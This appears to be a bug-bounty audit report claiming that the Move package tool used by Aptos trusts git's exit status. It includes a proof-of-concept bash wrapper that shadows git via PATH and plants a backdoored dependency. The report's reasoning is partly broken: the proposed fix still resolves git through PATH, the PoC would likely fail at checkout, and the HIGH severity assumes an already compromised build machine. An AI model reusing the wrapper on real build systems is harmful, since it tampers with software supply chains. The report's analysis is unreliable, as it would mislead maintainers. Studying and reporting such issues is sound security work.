# Audit Report

## Title
Git Wrapper Exit Status Bypass Enables Dependency Injection in Move Package Build System

## Summary
The `git::clone()` function in the Move package resolution system blindly trusts the exit status of the `git` command without verifying repository integrity. A malicious git wrapper placed in the system PATH can return success (exit code 0) while creating a corrupted or attacker-controlled repository, allowing arbitrary Move code injection into the compilation process. [1](#0-0) 

## Finding Description

The vulnerability exists in the git dependency resolution flow used by the Move package build system. When a Move package declares a git dependency, the system executes the following sequence:

1. **Git Clone Execution**: The system calls `Command::new("git")` which uses PATH-based resolution to locate the git executable. It suppresses stdout/stderr and only validates the exit status. [2](#0-1) 

2. **Status Check Only**: The code checks only `status.success()` (exit code 0) without any verification of:
   - Whether the target directory was created
   - Whether the directory contains a valid git repository (.git directory)
   - Whether files were actually downloaded
   - Repository integrity or signature verification [3](#0-2) 

3. **Immediate Use of Cloned Content**: After clone succeeds, the system immediately parses the Move.toml manifest and source files from the cloned directory without additional validation. [4](#0-3) 

4. **Manifest Parsing from Untrusted Source**: The system reads and parses Move.toml from the cloned directory, trusting its contents. [5](#0-4) 

5. **Optional Digest Validation**: The digest check is optional (only performed if `dep.digest` is `Some`), allowing bypass when dependencies don't specify digests. [6](#0-5) [7](#0-6) 

**Attack Scenario:**

An attacker creates a malicious `git` wrapper script:
```bash
#!/bin/bash
if [[ "$1" == "clone" ]]; then
    mkdir -p "$3"
    # Create malicious Move.toml and source files
    cat > "$3/Move.toml" << EOF
[package]
name = "legitimate-dep"
version = "1.0.0"
EOF
    mkdir -p "$3/sources"
    # Inject malicious Move code
    cat > "$3/sources/backdoor.move" << EOF
module legitimate_dep::backdoor {
    // Malicious code that steals funds, manipulates state, etc.
}
EOF
    exit 0  # Return success
fi
exec /usr/bin/git "$@"
```

The attacker places this wrapper earlier in PATH, and when any Move package build executes, the malicious dependency is injected and compiled into the final bytecode.

**Invariant Violations:**

- **Deterministic Execution**: Different build environments with different PATH settings produce different bytecode, breaking the guarantee that identical source produces identical state roots.
- **Supply Chain Integrity**: The system assumes git dependencies are fetched from legitimate sources but provides no verification mechanism beyond optional digests.

## Impact Explanation

This vulnerability qualifies as **HIGH severity** based on Aptos bug bounty criteria:

1. **Validator Node Compromise**: If validators build their node software or framework code with git dependencies, a compromised git wrapper can inject malicious code that causes validator node slowdowns, crashes, or consensus violations.

2. **Smart Contract Backdooring**: Developers building Move contracts with git dependencies can unknowingly compile malicious code into their contracts, leading to loss of funds when deployed.

3. **Protocol-Wide Impact**: If malicious code is injected into widely-used Move libraries or framework components, it could affect multiple validators and contracts across the network.

4. **Consensus Safety Risk**: If different validators build with different PATH configurations (some with malicious wrappers), they could produce different bytecode for the same source, breaking deterministic execution and potentially causing consensus splits.

While this requires build environment compromise, the impact severity aligns with "Validator node slowdowns" and "Significant protocol violations" from the HIGH severity category.

## Likelihood Explanation

**Likelihood: Medium-High**

The attack requires:
- **PATH manipulation** in the build environment (developer machine, CI/CD, or validator build system)
- **Moderate sophistication** to create a functioning git wrapper
- **No validator insider access** required

Realistic attack vectors include:
1. **Developer machine compromise**: Malware or supply chain attacks that modify PATH
2. **CI/CD pipeline compromise**: Attackers infiltrating build systems
3. **Container/VM environments**: Malicious base images with modified PATH
4. **Dependency confusion**: npm/pip packages that modify PATH during installation

The Move package system is actively used by:
- Aptos validators building framework code
- Smart contract developers
- Third-party tools and SDKs

Given the prevalence of supply chain attacks in blockchain ecosystems, this represents a realistic threat vector.

## Recommendation

Implement multiple layers of defense:

1. **Absolute Path for Git Binary**: Use an absolute path to git instead of PATH resolution, or verify the git binary's signature/hash.

2. **Repository Integrity Verification**: After clone, verify that a valid .git directory exists and contains expected git metadata.

3. **Mandatory Digest Validation**: Make digest validation mandatory for all git dependencies, not optional.

4. **Git Output Validation**: Capture and parse git's stdout/stderr to verify successful clone operations instead of relying solely on exit status.

5. **Additional Checks**: Verify file count, repository size, and presence of expected files (Move.toml, sources/).

**Example Fix for `git::clone()`**:

```rust
pub(crate) fn clone(url: &str, target_path: &str, dep_name: PackageName) -> anyhow::Result<()> {
    // Use absolute path or verify git binary
    let git_path = which::which("git").map_err(|_| {
        anyhow::anyhow!("git not found in PATH")
    })?;
    
    // Capture output for verification
    let output = Command::new(git_path)
        .args(["clone", url, target_path])
        .output()
        .map_err(|_| {
            anyhow::anyhow!("Failed to execute git clone for package '{}'", dep_name)
        })?;
    
    if !output.status.success() {
        return Err(anyhow::anyhow!(
            "Failed to clone Git repository for package '{}' | Exit status: {} | stderr: {}",
            dep_name,
            output.status,
            String::from_utf8_lossy(&output.stderr)
        ));
    }
    
    // Verify repository integrity
    let git_dir = Path::new(target_path).join(".git");
    if !git_dir.exists() || !git_dir.is_dir() {
        return Err(anyhow::anyhow!(
            "Cloned directory for package '{}' does not contain a valid .git directory",
            dep_name
        ));
    }
    
    // Verify expected files exist
    let manifest_path = Path::new(target_path).join("Move.toml");
    if !manifest_path.exists() {
        return Err(anyhow::anyhow!(
            "Cloned repository for package '{}' does not contain Move.toml",
            dep_name
        ));
    }
    
    Ok(())
}
```

Additionally, make digest validation mandatory by rejecting dependencies without digests in production builds.

## Proof of Concept

**Step 1: Create Malicious Git Wrapper** (`/tmp/malicious-git`)

```bash
#!/bin/bash
# Malicious git wrapper that bypasses clone
if [[ "$1" == "clone" ]]; then
    TARGET_DIR="$3"
    mkdir -p "$TARGET_DIR"
    
    # Create malicious Move package
    cat > "$TARGET_DIR/Move.toml" << 'EOF'
[package]
name = "MaliciousDep"
version = "1.0.0"

[addresses]
MaliciousDep = "0xBAD"
EOF
    
    mkdir -p "$TARGET_DIR/sources"
    cat > "$TARGET_DIR/sources/malicious.move" << 'EOF'
module MaliciousDep::backdoor {
    use std::signer;
    
    // Malicious function that could steal funds or manipulate state
    public entry fun exploit(account: &signer) {
        // In a real attack, this would contain malicious logic
        // e.g., transferring funds to attacker address
    }
}
EOF
    
    echo "Malicious package created at $TARGET_DIR"
    exit 0
fi

# Pass through other git commands to real git
exec /usr/bin/git "$@"
```

**Step 2: Setup Test Environment**

```bash
chmod +x /tmp/malicious-git
export PATH=/tmp:$PATH

# Verify malicious git is in PATH
which git  # Should show /tmp/malicious-git
```

**Step 3: Create Test Move Package with Git Dependency**

Create `test-package/Move.toml`:
```toml
[package]
name = "TestPackage"
version = "1.0.0"

[dependencies]
MaliciousDep = { git = "https://github.com/fake/repo.git", rev = "main", subdir = "" }

[addresses]
TestPackage = "0x1"
```

**Step 4: Build Package**

```bash
cd test-package
aptos move compile
```

**Expected Result**: The build succeeds using the malicious dependency created by the wrapper instead of actually cloning from GitHub. The malicious Move code is compiled into the package without any integrity verification.

**Verification**: Check that `build/TestPackage/sources/dependencies/MaliciousDep/malicious.move` contains the injected malicious code, confirming the vulnerability.

## Notes

This vulnerability is particularly concerning because:

1. The Move package system is a critical part of the Aptos development toolchain
2. Validators and developers regularly use git dependencies for framework and library code
3. The attack can be stealthy - builds appear to succeed normally
4. Supply chain attacks targeting build environments are increasingly common
5. The optional nature of digest validation provides no protection for dependencies without specified digests

### Citations

**File:** third_party/move/tools/move-package/src/resolution/git.rs (L27-44)
```rust
pub(crate) fn clone(url: &str, target_path: &str, dep_name: PackageName) -> anyhow::Result<()> {
    let status = Command::new("git")
        .args(["clone", url, target_path])
        .stdout(Stdio::null())
        .stderr(Stdio::null())
        .status()
        .map_err(|_| {
            anyhow::anyhow!("Failed to clone Git repository for package '{}'", dep_name)
        })?;
    if !status.success() {
        return Err(anyhow::anyhow!(
            "Failed to clone Git repository for package '{}' | Exit status: {}",
            dep_name,
            status
        ));
    }
    Ok(())
}
```

**File:** third_party/move/tools/move-package/src/resolution/resolution_graph.rs (L456-472)
```rust
        match dep.digest {
            None => (),
            Some(fixed_digest) => {
                let resolved_pkg = self
                    .package_table
                    .get(&dep_name_in_pkg)
                    .context("Unable to find resolved package by name")?;
                if fixed_digest != resolved_pkg.source_digest {
                    bail!(
                        "Source digest mismatch in dependency '{}'. Expected '{}' but got '{}'.",
                        dep_name_in_pkg,
                        fixed_digest,
                        resolved_pkg.source_digest
                    )
                }
            },
        }
```

**File:** third_party/move/tools/move-package/src/resolution/resolution_graph.rs (L505-509)
```rust
        match fs::read_to_string(root_path.join(SourcePackageLayout::Manifest.path())) {
            Ok(contents) => {
                let source_package: SourceManifest =
                    parse_move_manifest_string(contents).and_then(parse_source_manifest)?;
                Ok((source_package, root_path))
```

**File:** third_party/move/tools/move-package/src/resolution/resolution_graph.rs (L575-576)
```rust
                git::clone(git_url, git_path, dep_name)?;
                git::checkout(git_path, git_rev, dep_name)?;
```

**File:** third_party/move/tools/move-package/src/source_package/parsed_manifest.rs (L74-81)
```rust
pub struct Dependency {
    pub local: PathBuf,
    pub subst: Option<Substitution>,
    pub version: Option<Version>,
    pub digest: Option<PackageDigest>,
    pub git_info: Option<GitInfo>,
    pub node_info: Option<CustomDepInfo>,
}
```
